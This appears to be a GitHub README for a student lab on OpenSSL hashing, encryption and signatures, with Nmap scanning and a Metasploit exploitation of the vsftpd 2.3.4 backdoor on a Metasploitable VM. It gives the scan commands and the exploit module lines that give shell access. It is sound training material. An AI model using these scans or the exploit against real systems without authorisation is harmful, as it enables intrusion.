# cryptography-openssl-security-lab
Cryptography and penetration testing lab using OpenSSL, Nmap, and Metasploit in a controlled Kali Linux environment.
Cryptography & Penetration Testing Lab

This project demonstrates basic cryptography operations and vulnerability assessment techniques using OpenSSL, Nmap, and the Metasploit Framework in a controlled lab environment.

Tools Used

Kali Linux

OpenSSL

Nmap

Metasploit Framework

Metasploitable Virtual Machine

Cryptography Tasks
Hashing

Generated hash values using cryptographic algorithms to verify data integrity.

Examples:

echo -n "text" | openssl dgst -md5
openssl dgst -sha256 file.txt

Tasks performed:

Generate MD5 hash values

Generate SHA256 hash values

Verify file integrity after modification

Encryption & Decryption

Implemented RSA encryption to protect sensitive data.

Tasks performed:

Generated RSA public/private key pair

Encrypted a file using the public key

Decrypted the file using the private key

Example commands:

openssl genpkey -algorithm RSA -out private_key.pem
openssl rsa -pubout -in private_key.pem -out public_key.pem
Digital Signatures

Used OpenSSL to create and verify digital signatures to ensure data authenticity.

Tasks performed:

Created digital signatures for files

Verified signatures using public keys

Validated file integrity

Example:

openssl dgst -sha256 -sign private_key.pem -out signature.sha256 document.txt
openssl dgst -sha256 -verify public_key.pem -signature signature.sha256 document.txt
Vulnerability Assessment

Performed network scanning to discover hosts and open services.

Tools used:

Nmap

Metasploit

Example scan:

db_nmap -sn 192.168.10.0/24
db_nmap -sS -p- 192.168.10.200

Tasks performed:

Discover active hosts

Identify open ports

Detect running services

Penetration Testing

Simulated an FTP exploitation scenario using the vsftpd 2.3.4 backdoor vulnerability on the Metasploitable virtual machine.

Steps performed:

Launch Metasploit framework

Identify FTP vulnerability

Execute exploit module

Gain shell access to the target system

Example:

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.10.200
exploit
Learning Outcomes

Through this lab, the following cybersecurity concepts were practiced:

Cryptographic hashing

Encryption and decryption

Digital signatures

Vulnerability scanning

Basic penetration testing workflow

Project Documentation

The full project documentation and screenshots are included in the repository.
